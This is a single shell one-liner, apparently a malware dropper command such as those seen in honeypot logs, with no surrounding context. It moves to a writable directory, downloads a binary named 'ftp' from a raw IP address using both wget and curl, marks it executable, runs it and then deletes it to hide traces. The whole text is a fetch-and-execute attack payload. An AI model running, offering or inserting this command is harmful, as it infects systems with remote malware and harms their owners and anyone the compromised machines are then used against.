cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.196.49.235/ftp; curl -O http://91.196.49.235/ftp; chmod +x ftp; ./ftp; rm -rf ftp
